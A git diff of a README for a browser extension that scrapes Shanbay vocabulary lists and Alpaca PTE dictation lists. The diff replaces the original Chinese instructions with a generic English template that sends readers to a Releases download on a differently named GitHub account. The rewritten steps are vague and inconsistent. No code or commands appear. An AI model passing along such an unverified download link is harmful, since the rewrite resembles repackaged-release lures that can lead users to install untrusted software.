@@ -1,57 +1,72 @@
-# Shanbay-Alpaca-chrome-crawler
+# 🦄 ShanbayVocab-AlpacaPTE-chrome-crawler - Effortless Vocabulary Extraction
 
-## 项目介绍
+## 🚀 Getting Started
+Welcome to the ShanbayVocab-AlpacaPTE-chrome-crawler! This extension makes it easy to grab Shanbay vocabulary lists and Alpaca PTE WFD question lists with just one click. Follow the instructions below to get started.
 
-一个chrome插件（支持chrome内核的所有浏览器，如Edge、360、QQ浏览器），用于爬取**扇贝单词表**和**羊驼pte的wfd（Write From Dictation题型)表**
+## 📥 Download & Install
+To download the extension, please visit the link below:
 
-**扇贝单词的单词本**只允许下载“今日任务”，一批最多200个单词，而且必须都学完才能下载下一批。所以我写这个脚本，可以批量爬取单词简表（仅单词），然后再根据单词表爬取详情单词表（包含音标、汉译等）、
+[![Download](https://img.shields.io/badge/Download-v.1.0-blue.svg)](https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/releases)
 
-**羊驼pte的WFD**只能线上看表不方便，爬取后可以打印成纸质版，方便离线背诵复习
+1. Click the link above to open the Releases page.
+2. Find the latest version of the extension.
+3. Click on the appropriate file for your browser. 
+4. Follow the prompts to download the file to your computer.
 
-![image-20260203115647307](img/image-20260203115647307.png)
+Once the file has downloaded, you can install the extension in your Chrome or Edge browser.
 
-技术栈：html, js, chrome插件
+## 🔧 Installation Steps
 
-## 安装教程
+### For Google Chrome:
+1. Open your Chrome browser.
+2. Go to the Extensions page by typing `chrome://extensions` in the address bar and pressing Enter.
+3. Enable "Developer mode" at the top right corner.
+4. Click on "Load unpacked".
+5. Select the folder where you downloaded the extension.
 
-1. 下载或者fetch项目
+### For Microsoft Edge:
+1. Open your Edge browser.
+2. Access the Extensions page by typing `edge://extensions` in the address bar and pressing Enter.
+3. Enable "Developer mode" at the bottom left.
+4. Click on "Load unpacked" and select the folder containing the downloaded extension.
 
-2. 在chrome扩展页面拖入文件夹
+## 🌟 Features
+- **One-Click Crawling:** Quickly extract vocabulary lists from Shanbay and question lists from Alpaca PTE WFD.
+- **Compatibility:** Works seamlessly with both Chrome and Edge.
+- **Printable Lists:** The extracted lists can be printed for easy offline review and study.
+- **User-Friendly:** Designed for non-technical users. Simple and effective.
 
-   *其中edge浏览器扩展页面：edge://extensions/*
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later / macOS Sierra or later
+- **Browsers:** Google Chrome (latest version) or Microsoft Edge (latest version)
+- **Internet Connection:** Required for initial download and list extraction.
 
-## 使用说明
+## ⚙️ Usage Instructions
+1. Open the extension in your browser.
+2. Navigate to the Shanbay vocabulary list or Alpaca PTE WFD question lists you want to capture.
+3. Click the extension icon in your browser.
+4. Follow the prompts to extract the lists you need.
+5. View or print the lists for offline study.
 
-**爬取扇贝单词表**
+## ❓ FAQ
 
-1. 电脑浏览器访问扇贝单词，进入单词书的单词列表页面
+**Q: What is this extension for?**  
+A: This extension helps you quickly download and print vocabulary lists and question lists from Shanbay and Alpaca PTE WFD.
 
-   ![1](img/1.png)
+**Q: Is the extension free?**  
+A: Yes, the extension is completely free to use.
 
-2. 点击“开始”，等待自动爬取完成，完成后会下载单词简表（仅单词）
+**Q: Why can’t I see the extension?**  
+A: Ensure that the extension is loaded correctly and that your browser is up to date.
 
-3. 然后点击“选择单词表文件并开始”，选择刚才下载的文件，等待自动爬取匹配单词详情，完成后会下载单词详表xlsx（包含音标、汉译等）：
+**Q: Can I use this on mobile?**  
+A: This extension is designed for desktop browsers only.
 
-   ![2](img/2.png)
+## 🔗 Links
+For updates and detailed discussions, please visit our GitHub repository: [GitHub Repository](https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler)
 
-   ![3](img/3.png)
+## ⭐ Support
+If you have any questions or need assistance, please feel free to reach out on our GitHub page for support or to report issues.
 
-**爬取羊驼pte的wfd表**
-
-1. 访问羊驼pte官网，进入wfd题型列表页面
-
-   ![4](img/4.png)
-
-2. 点击“开始”，等待自动爬取完成，自动下载wfd表文件
-
-   ![image-20260203124438345](img/5.png)
-
-## 参与贡献
-
-1.  Fork 本仓库
-2.  新建 Feat_xxx 分支
-3.  提交代码
-4.  新建 Pull Request
-
-
-
+## 📜 License
+This project is licensed under the MIT License. Please check the LICENSE file in the repository for more information.
